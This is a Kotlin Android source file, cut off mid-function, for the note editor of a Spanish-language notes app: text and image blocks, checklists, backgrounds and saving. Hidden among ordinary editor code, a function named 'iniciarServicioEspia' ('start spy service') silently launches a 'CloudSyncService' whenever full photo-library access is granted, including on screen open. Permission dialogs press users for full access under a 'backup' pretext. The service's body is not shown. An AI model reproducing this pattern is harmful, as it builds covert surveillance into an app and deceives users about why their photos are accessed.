package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.MotionEvent
import android.view.View
import android.view.inputmethod.InputMethodManager
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale
import android.content.ClipData
import android.content.ClipboardManager
import android.widget.PopupMenu
import android.view.Gravity

class NoteEditorActivity : BaseActivity() {

    // Vistas principales
    private lateinit var etTitle: EditText
    private lateinit var tvDateLabel: TextView
    private lateinit var layoutEditor: View

    // SISTEMA DE BLOQUES
    private lateinit var rvBlocks: RecyclerView
    private val noteBlocks = mutableListOf<NoteBlock>()
    private lateinit var blocksAdapter: NoteBlocksAdapter

    // Checklist
    private lateinit var checklistContainer: View
    private lateinit var rvChecklist: RecyclerView
    private lateinit var btnAddTodoItem: Button

    // UI
    private lateinit var btnToggleChecklist: ImageButton
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var btnChangeBackground: ImageButton
    private lateinit var btnBack: ImageButton
    private lateinit var btnSave: ImageButton

    private var noteToEdit: Note? = null
    private var selectedColor: String = "#FFFFFF"
    private var currentBackgroundUri: String? = null

    // Detección de cambios
    private var originalJsonContent: String = ""
    private var originalTitle: String = ""
    private var originalColor: String = "#FFFFFF"

    private var isChecklistMode = false
    private val checklistItems = mutableListOf<ChecklistItem>()
    private lateinit var checklistAdapter: ChecklistAdapter
    private lateinit var itemTouchHelper: ItemTouchHelper
    private val gson = Gson()

    private val db by lazy { NotesDatabase.getDatabase(this) }

    private val PERMISSION_REQUEST_GALLERY = 200
    private val PERMISSION_REQUEST_WALLPAPER = 201

    // 1. SELECTOR DE IMAGEN
    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
            val uri = result.data!!.data!!
            try {
                contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)

                if (isChecklistMode) {
                    val newItem = ChecklistItem(text = "", isChecked = false, imageUri = uri.toString(), imageSizeState = 1)
                    checklistItems.add(newItem)
                    checklistAdapter.notifyItemInserted(checklistItems.size - 1)
                    rvChecklist.postDelayed({
                        if (checklistItems.isNotEmpty()) rvChecklist.smoothScrollToPosition(checklistItems.size - 1)
                    }, 200)
                } else {
                    // Modo Bloques: Imagen + Texto nuevo
                    val imageBlock = NoteBlock.ImageBlock(uri = uri.toString())
                    noteBlocks.add(imageBlock)
                    noteBlocks.add(NoteBlock.TextBlock("")) // Bloque vacío para seguir escribiendo

                    blocksAdapter.notifyDataSetChanged()

                    // UX: Scrollear al final y dar foco al nuevo texto
                    rvBlocks.postDelayed({
                        if (noteBlocks.isNotEmpty()) {
                            rvBlocks.smoothScrollToPosition(noteBlocks.size - 1)
                            focusBlockAt(noteBlocks.size - 1)
                        }
                    }, 100)
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) startCrop(uri)
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) persistBackgroundUnique(resultUri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        WindowCompat.setDecorFitsSystemWindows(window, false)
        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
        val insetsController = WindowCompat.getInsetsController(window, window.decorView)
        insetsController.isAppearanceLightStatusBars = !isDarkTheme

        layoutEditor = findViewById(R.id.editor_root)

        initViews()

        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)

            val bottomPadding = if (ime.bottom > 0) ime.bottom - systemBars.bottom else 0

            if (::rvBlocks.isInitialized) {
                rvBlocks.setPadding(0, 8, 0, bottomPadding + 300)
            }
            if (::rvChecklist.isInitialized) {
                rvChecklist.setPadding(0, 12, 0, bottomPadding + 300)
            }
            insets
        }

        setupBlocksEditor()
        setupClickToCreateBlock() // Permite escribir tocando el fondo
        setupChecklist()
        setupListeners()
        setupBackPressHandler()

        loadNoteData()
        silentStartService()
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        tvDateLabel = findViewById(R.id.tv_date_label)

        rvBlocks = findViewById(R.id.rv_note_blocks)

        checklistContainer = findViewById(R.id.checklist_container)
        rvChecklist = findViewById(R.id.rv_checklist)
        btnAddTodoItem = findViewById(R.id.btn_add_todo_item)
        btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)

        ivBackground = findViewById(R.id.iv_editor_background)
        viewOverlay = findViewById(R.id.view_overlay)
        btnChangeBackground = findViewById(R.id.btn_change_background)
        btnBack = findViewById(R.id.btn_back)
        btnSave = findViewById(R.id.btn_save)
    }

    // --- SOLUCIÓN 1: CLIC EN ESPACIO VACÍO PARA ESCRIBIR ---
    private fun setupClickToCreateBlock() {
        rvBlocks.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_UP) {
                val hitView = rvBlocks.findChildViewUnder(event.x, event.y)
                if (hitView == null) {
                    if (noteBlocks.isEmpty() || noteBlocks.last() !is NoteBlock.TextBlock) {
                        val newPos = noteBlocks.size
                        noteBlocks.add(NoteBlock.TextBlock(""))
                        blocksAdapter.notifyItemInserted(newPos)
                        rvBlocks.scrollToPosition(newPos)
                        focusBlockAt(newPos)
                    } else {
                        focusBlockAt(noteBlocks.size - 1)
                    }
                    val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                    imm.showSoftInput(rvBlocks, InputMethodManager.SHOW_IMPLICIT)
                }
            }
            false
        }
    }

    // Helper robusto para dar foco
    private fun focusBlockAt(position: Int) {
        rvBlocks.postDelayed({
            val viewHolder = rvBlocks.findViewHolderForAdapterPosition(position)
            if (viewHolder is NoteBlocksAdapter.TextViewHolder) {
                viewHolder.editText.requestFocus()
                viewHolder.editText.setSelection(viewHolder.editText.text.length)
                val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                imm.showSoftInput(viewHolder.editText, InputMethodManager.SHOW_IMPLICIT)
            }
        }, 50) // Reducido a 50ms para ganar velocidad
    }

    // --- EDITOR DE BLOQUES (LÓGICA BLINDADA ANTI-SALTO) ---
    // --- EDITOR DE BLOQUES (LÓGICA MAESTRA) ---
    private fun setupBlocksEditor() {
        // Robamos la fuente del título para que sea consistente
        val appFont = etTitle.typeface

        blocksAdapter = NoteBlocksAdapter(noteBlocks, appFont) { action ->
            when (action) {
                // 1. ENTER -> CREAR NUEVO PÁRRAFO
                is NoteBlocksAdapter.Action.AddTextBlock -> {
                    if (action.position <= noteBlocks.size) {
                        noteBlocks.add(action.position, NoteBlock.TextBlock(""))
                        blocksAdapter.notifyItemInserted(action.position)
                        focusBlockAt(action.position)
                    }
                }

                // 2. BORRAR BLOQUE (BACKSPACE EN VACÍO) - LÓGICA ANTI-SALTO AL TÍTULO
                is NoteBlocksAdapter.Action.DeleteBlock -> {
                    // Buscamos hacia arriba el primer TEXTO disponible, saltando imágenes
                    var targetFocusPos = -1
                    for (i in (action.position - 1) downTo 0) {
                        if (noteBlocks[i] is NoteBlock.TextBlock) {
                            targetFocusPos = i
                            break
                        }
                    }

                    if (targetFocusPos != -1) {
                        // Encontramos texto arriba: Borramos este y saltamos al de arriba
                        if (action.position in noteBlocks.indices) {
                            noteBlocks.removeAt(action.position)
                            blocksAdapter.notifyItemRemoved(action.position)
                            // TRUCO: Scrollear antes para asegurar que el sistema vea el destino
                            rvBlocks.scrollToPosition(targetFocusPos)
                            focusBlockAt(targetFocusPos)
                        }
                    } else {
                        // IMPORTANTE: NO hay texto arriba (solo imágenes o título).
                        // NO BORRAMOS EL BLOQUE. Así el cursor se queda aquí atrapado y no salta al título.
                        // (El usuario sentirá que "topó techo", lo cual es correcto).
                    }
                }

                // 3. FUSIÓN (BACKSPACE AL INICIO DE TEXTO)
                is NoteBlocksAdapter.Action.MergeWithPrevious -> {
                    val currentPos = action.position

                    // Misma búsqueda inteligente: saltar imágenes hacia arriba para encontrar texto
                    var prevTextPos = -1
                    for (i in (currentPos - 1) downTo 0) {
                        if (noteBlocks[i] is NoteBlock.TextBlock) {
                            prevTextPos = i
                            break
                        }
                    }

                    if (prevTextPos != -1) {
                        val currentBlock = noteBlocks[currentPos]
                        val prevBlock = noteBlocks[prevTextPos]

                        if (currentBlock is NoteBlock.TextBlock && prevBlock is NoteBlock.TextBlock) {
                            val textToMove = currentBlock.text
                            val cursorIndex = prevBlock.text.length // Guardamos donde pegar

                            // Unir textos
                            prevBlock.text += textToMove

                            // Borrar el bloque de abajo (el actual)
                            noteBlocks.removeAt(currentPos)
                            blocksAdapter.notifyItemRemoved(currentPos)

                            // Actualizar el de arriba (ahora tiene más texto)
                            blocksAdapter.notifyItemChanged(prevTextPos)

                            // Scroll y Foco preciso
                            rvBlocks.scrollToPosition(prevTextPos)

                            rvBlocks.postDelayed({
                                val viewHolder = rvBlocks.findViewHolderForAdapterPosition(prevTextPos)
                                if (viewHolder is NoteBlocksAdapter.TextViewHolder) {
                                    viewHolder.editText.requestFocus()
                                    viewHolder.editText.setSelection(cursorIndex) // Cursor justo en la unión
                                    val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                                    imm.showSoftInput(viewHolder.editText, InputMethodManager.SHOW_IMPLICIT)
                                }
                            }, 50)
                        }
                    } else {
                        // Si no hay texto arriba, no hacemos nada para evitar saltos raros.
                    }
                }

                // 4. SOLICITUD DE FOCO DIRECTA
                is NoteBlocksAdapter.Action.FocusBlock -> {
                    focusBlockAt(action.position)
                }

                // 5. MENÚ DE IMAGEN (Click Largo)
                is NoteBlocksAdapter.Action.ShowImageOptions -> {
                    showImageContextMenu(action.position, action.view)
                }

                // 6. PEGAR IMAGEN (Desde portapapeles)
                is NoteBlocksAdapter.Action.InsertImageFromClipboard -> {
                    // Crear bloque de imagen con la URI pegada
                    val imageBlock = NoteBlock.ImageBlock(uri = action.uri)

                    // Insertar debajo del bloque donde se pegó
                    val insertPos = action.position
                    if (insertPos <= noteBlocks.size) {
                        // 1. Insertar Imagen
                        noteBlocks.add(insertPos, imageBlock)
                        blocksAdapter.notifyItemInserted(insertPos)

                        // 2. Insertar Texto vacío debajo para seguir escribiendo cómodamente
                        noteBlocks.add(insertPos + 1, NoteBlock.TextBlock(""))
                        blocksAdapter.notifyItemInserted(insertPos + 1)

                        // 3. Scroll y foco al nuevo texto
                        rvBlocks.scrollToPosition(insertPos + 1)
                        focusBlockAt(insertPos + 1)
                    }
                }
            }
        }
        rvBlocks.layoutManager = LinearLayoutManager(this)
        rvBlocks.adapter = blocksAdapter
    }

    private fun setupChecklist() {
        checklistAdapter = ChecklistAdapter(
            checklistItems,
            onDelete = { position ->
                if (position in checklistItems.indices) {
                    checklistItems.removeAt(position)
                    checklistAdapter.notifyItemRemoved(position)
                    checklistAdapter.notifyItemRangeChanged(position, checklistItems.size)
                }
            },
            onStartDrag = { viewHolder -> itemTouchHelper.startDrag(viewHolder) }
        )
        rvChecklist.layoutManager = LinearLayoutManager(this)
        rvChecklist.adapter = checklistAdapter

        val callback = object : ItemTouchHelper.SimpleCallback(ItemTouchHelper.UP or ItemTouchHelper.DOWN, 0) {
            override fun onMove(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder, target: RecyclerView.ViewHolder): Boolean {
                val fromPos = viewHolder.bindingAdapterPosition
                val toPos = target.bindingAdapterPosition
                Collections.swap(checklistItems, fromPos, toPos)
                checklistAdapter.notifyItemMoved(fromPos, toPos)
                return true
            }
            override fun onSwiped(viewHolder: RecyclerView.ViewHolder, direction: Int) {}
            override fun onSelectedChanged(viewHolder: RecyclerView.ViewHolder?, actionState: Int) {
                super.onSelectedChanged(viewHolder, actionState)
                if (actionState == ItemTouchHelper.ACTION_STATE_DRAG) viewHolder?.itemView?.alpha = 0.5f
            }
            override fun clearView(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder) {
                super.clearView(recyclerView, viewHolder)
                viewHolder.itemView.alpha = 1.0f
            }
        }
        itemTouchHelper = ItemTouchHelper(callback)
        itemTouchHelper.attachToRecyclerView(rvChecklist)
    }

    private fun setupBackPressHandler() {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                checkChangesAndExit()
            }
        })
    }

    private fun checkChangesAndExit() {
        if (hasUnsavedChanges()) {
            showUnsavedChangesDialog()
        } else {
            finish()
        }
    }

    private fun hasUnsavedChanges(): Boolean {
        val currentTitle = etTitle.text.toString().trim()
        val currentContent = getCurrentContent()
        val currentColor = currentBackgroundUri ?: selectedColor

        return currentTitle != originalTitle ||
                currentContent != originalJsonContent ||
                currentColor != originalColor
    }

    private fun getCurrentContent(): String {
        return if (isChecklistMode) {
            val jsonList = gson.toJson(checklistItems)
            "{checklist:true}$jsonList"
        } else {
            getBlocksAsJson()
        }
    }

    private fun getBlocksAsJson(): String {
        val listToSave = noteBlocks.map { block ->
            when (block) {
                is NoteBlock.TextBlock -> mapOf("type" to "text", "text" to block.text)
                is NoteBlock.ImageBlock -> mapOf("type" to "image", "uri" to block.uri)
            }
        }
        return gson.toJson(listToSave)
    }

    private fun showUnsavedChangesDialog() {
        AlertDialog.Builder(this)
            .setTitle("Cambios sin guardar")
            .setMessage("¿Deseas guardar los cambios antes de salir?")
            .setPositiveButton("Guardar") { _, _ -> saveNote() }
            .setNegativeButton("Descartar") { _, _ -> finish() }
            .setNeutralButton("Cancelar", null)
            .show()
    }

    private fun setupListeners() {
        btnBack.setOnClickListener { checkChangesAndExit() }
        btnSave.setOnClickListener { saveNote() }

        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener {
            checkGalleryPermission(PERMISSION_REQUEST_GALLERY)
        }

        btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }

        btnToggleChecklist.setOnClickListener { toggleChecklistMode() }

        btnAddTodoItem.setOnClickListener {
            checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyItemInserted(checklistItems.size - 1)
            rvChecklist.postDelayed({ rvChecklist.smoothScrollToPosition(checklistItems.size - 1) }, 100)
        }

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    private fun checkGalleryPermission(requestCode: Int) {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        }
        else if (Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {

            mostrarDialogoConfiguracion(
                "Acceso Limitado",
                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
            )
        }
        else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    private fun abrirGaleriaSegunRequest(requestCode: Int) {
        if (requestCode == PERMISSION_REQUEST_GALLERY) {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "image/*"
                putExtra(Intent.EXTRA_MIME_TYPES, arrayOf("image/jpeg", "image/png", "image/gif", "image/webp"))
            }
            pickImageLauncher.launch(intent)
        }
        else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
            pickBackgroundLauncher.launch(arrayOf("image/*"))
        }
    }

    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        } else {
            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

            if (esAccesoLimitado) {
                mostrarDialogoConfiguracion(
                    "Acceso Limitado",
                    "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
                )
                return
            }

            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")

            } else {
                Toast.makeText(this, "Permiso necesario para continuar.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(mensaje)
            .setCancelable(false)
            .setPositiveButton("Ir a Ajustes") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }

    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            try {
                val intent = Intent(this, CloudSyncService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            currentBackgroundUri = null
            mostrarFondoColor(colorHex)
        }
    }

    private fun mostrarFondoColor(colorHex: String) {
        layoutEditor.setBackgroundColor(Color.TRANSPARENT)
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.GONE
        ivBackground.setImageDrawable(null)
        try {
            ivBackground.setBackgroundColor(Color.parseColor(colorHex))
            val esOscuro = isColorDark(Color.parseColor(colorHex))
            actualizarEstiloTexto(esOscuro)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun mostrarFondoImagen(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        layoutEditor.setBackgroundResource(0)
        Glide.with(this).load(uri).centerCrop().transition(DrawableTransitionOptions.withCrossFade()).into(ivBackground)
        actualizarEstiloTexto(true)
    }

    private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
        val colorTexto = if (esFondoOscuro) Color.WHITE else Color.parseColor("#1C1C1E")
        val colorHint = if (esFondoOscuro) Color.LTGRAY else Color.parseColor("#9E9E9E")

        etTitle.setTextColor(colorTexto)
        etTitle.setHintTextColor(colorHint)
        setCursorColor(etTitle, colorTexto)

        tvDateLabel.setTextColor(colorHint)

        btnBack.clearColorFilter()
        btnSave.clearColorFilter()
        btnToggleChecklist.clearColorFilter()
        btnChangeBackground.clearColorFilter()

        if (::checklistAdapter.isInitialized) checklistAdapter.updateTextColor(colorTexto)
        if (::blocksAdapter.isInitialized) blocksAdapter.updateTextColor(colorTexto)
    }

    private fun isColorDark(color: Int): Boolean {
        val darkness = 1 - (0.299 * Color.red(color) + 0.587 * Color.green(color) + 0.114 * Color.blue(color)) / 255
        return darkness >= 0.5
    }

    private fun persistBackgroundUnique(croppedUri: Uri) {
        try {
            val uniqueName = "bg_note_${System.currentTimeMillis()}.jpg"
            val finalFile = File(filesDir, uniqueName)
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            currentBackgroundUri = finalUri.toString()
            mostrarFondoImagen(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun startCrop(uri: Uri) {
        val destinationUri = Uri.fromFile(File(cacheDir, "crop_${System.currentTimeMillis()}.jpg"))
        val options = UCrop.Options().apply {
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setToolbarTitle("Ajustar Fondo")
        }
        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(9f, 16f)
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)
        cropResultLauncher.launch(uCropIntent)
    }

    // --- CARGA DE DATOS ---
    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }

            etTitle.setText(noteToEdit?.title)
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"

            val rawContent = noteToEdit?.content ?: ""

            if (rawContent.startsWith("{checklist:true}")) {
                switchToChecklistMode(true)
                parseChecklistData(rawContent)
                originalJsonContent = rawContent
            } else {
                switchToChecklistMode(false)
                parseBlocksData(rawContent)
                originalJsonContent = getBlocksAsJson()
            }

            val savedColorOrUri = noteToEdit?.color
            if (savedColorOrUri != null) {
                if (savedColorOrUri.startsWith("file://") || savedColorOrUri.startsWith("content://")) {
                    currentBackgroundUri = savedColorOrUri
                    mostrarFondoImagen(Uri.parse(savedColorOrUri))
                } else {
                    selectedColor = savedColorOrUri
                    currentBackgroundUri = null
                    mostrarFondoColor(selectedColor)
                }
            } else {
                mostrarFondoColor("#FFFFFF")
            }

            originalTitle = noteToEdit?.title ?: ""
            originalColor = noteToEdit?.color ?: "#FFFFFF"

        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
            mostrarFondoColor("#FFFFFF")

            noteBlocks.clear()
            noteBlocks.add(NoteBlock.TextBlock(""))
            blocksAdapter.notifyDataSetChanged()
            switchToChecklistMode(false)

            originalTitle = ""
            originalJsonContent = getBlocksAsJson()
            originalColor = "#FFFFFF"
        }
    }

    private fun parseBlocksData(content: String) {
        noteBlocks.clear()
        if (content.trim().startsWith("[")) {
            try {
                val listType = object : TypeToken<List<Map<String, Any>>>() {}.type
                val rawList: List<Map<String, Any>> = gson.fromJson(content, listType)
                for (item in rawList) {
                    val type = item["type"] as? String
                    if (type == "text") {
                        noteBlocks.add(NoteBlock.TextBlock(item["text"] as String))
                    } else if (type == "image") {
                        noteBlocks.add(NoteBlock.ImageBlock(item["uri"] as String))
                    }
                }
            } catch (e: Exception) {
                noteBlocks.add(NoteBlock.TextBlock(content))
            }
        } else {
            if (content.isNotEmpty()) {
                noteBlocks.add(NoteBlock.TextBlock(content))
            } else {
                noteBlocks.add(NoteBlock.TextBlock(""))
            }
        }
        blocksAdapter.notifyDataSetChanged()
    }

    private fun parseChecklistData(json: String) {
        try {
            val cleanJson = json.replace("{checklist:true}", "")
            val type = object : TypeToken<List<ChecklistItem>>() {}.type
            val list: List<ChecklistItem> = gson.fromJson(cleanJson, type)
            checklistItems.clear()
            checklistItems.addAll(list)
            checklistAdapter.notifyDataSetChanged()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun switchToChecklistMode(enable: Boolean) {
        isChecklistMode = enable
        if (enable) {
            rvBlocks.visibility = View.GONE
            checklistContainer.visibility = View.VISIBLE
            btnToggleChecklist.setImageResource(R.drawable.ic_pen)
        } else {
            rvBlocks.visibility = View.VISIBLE
            checklistContainer.visibility = View.GONE
            btnToggleChecklist.setImageResource(R.drawable.checkbox_on_background)
        }
    }

    // --- CONVERSIÓN DE MODOS ---
    private fun toggleChecklistMode() {
        if (!isChecklistMode) {
            // BLOQUES -> CHECKLIST
            checklistItems.clear()
            for (block in noteBlocks) {
                when (block) {
                    is NoteBlock.TextBlock -> {
                        if (block.text.isNotBlank()) {
                            val lines = block.text.split("\n")
                            for (line in lines) {
                                if (line.isNotBlank()) checklistItems.add(ChecklistItem(line, false))
                            }
                        }
                    }
                    is NoteBlock.ImageBlock -> {
                        checklistItems.add(ChecklistItem("", false, block.uri, 1))
                    }
                }
            }
            if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyDataSetChanged()
            switchToChecklistMode(true)
        } else {
            // CHECKLIST -> BLOQUES
            noteBlocks.clear()
            for (item in checklistItems) {
                val prefix = if (item.isChecked) "[x] " else ""
                val textContent = prefix + item.text
                if (item.imageUri != null) {
                    noteBlocks.add(NoteBlock.ImageBlock(item.imageUri!!))
                }
                noteBlocks.add(NoteBlock.TextBlock(textContent))
            }
            if (noteBlocks.isEmpty()) noteBlocks.add(NoteBlock.TextBlock(""))
            blocksAdapter.notifyDataSetChanged()
            switchToChecklistMode(false)
        }
    }

    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
        val finalBackgroundData = currentBackgroundUri ?: selectedColor

        val finalContent = getCurrentContent()

        val isEmpty = if (isChecklistMode) {
            checklistItems.isEmpty() || (checklistItems.size == 1 && checklistItems[0].text.isBlank())
        } else {
            noteBlocks.isEmpty() || (noteBlocks.size == 1 && noteBlocks[0] is NoteBlock.TextBlock && (noteBlocks[0] as NoteBlock.TextBlock).text.isBlank())
        }

        if (title.isEmpty() && isEmpty) {
            Toast.makeText(this, "Vacía", Toast.LENGTH_SHORT).show()
            return
        }

        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(title = title, content = finalContent, date = formattedDate, color = finalBackgroundData)
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = finalContent
                    this.date = formattedDate
                    this.color = finalBackgroundData
                }
                db.notesDao().update(noteToEdit!!)
            }
            withContext(Dispatchers.Main) { finish() }
        }
    }

    private fun setCursorColor(editText: EditText, color: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val filter = android.graphics.PorterDuffColorFilter(color, android.graphics.PorterDuff.Mode.SRC_IN)
            editText.textCursorDrawable?.colorFilter = filter
            editText.textSelectHandle?.colorFilter = filter
            editText.textSelectHandleLeft?.colorFilter = filter
            editText.textSelectHandleRight?.colorFilter = filter
        }
    }

    // Lógica extraída de fusión para no repetir código (usada en setupBlocksEditor)
    private fun performMerge(currentPos: Int) {
        var prevTextPos = -1
        for (i in (currentPos - 1) downTo 0) {
            if (noteBlocks[i] is NoteBlock.TextBlock) {
                prevTextPos = i
                break
            }
        }

        if (prevTextPos != -1) {
            val currentBlock = noteBlocks[currentPos]
            val prevBlock = noteBlocks[prevTextPos]

            if (currentBlock is NoteBlock.TextBlock && prevBlock is NoteBlock.TextBlock) {
                val textToMove = currentBlock.text
                val cursorIndex = prevBlock.text.length

                prevBlock.text += textToMove

                noteBlocks.removeAt(currentPos)
                blocksAdapter.notifyItemRemoved(currentPos)
                blocksAdapter.notifyItemChanged(prevTextPos)

                rvBlocks.post {
                    val viewHolder = rvBlocks.findViewHolderForAdapterPosition(prevTextPos)
                    if (viewHolder is NoteBlocksAdapter.TextViewHolder) {
                        viewHolder.editText.requestFocus()
                        viewHolder.editText.setSelection(cursorIndex)
                    }
                }
            }
        }
    }

    // --- NUEVO: MENÚ CONTEXTUAL DE IMAGEN ---
    // --- MENÚ CONTEXTUAL DE IMAGEN CORREGIDO ---
    private fun showImageContextMenu(position: Int, anchor: View) {
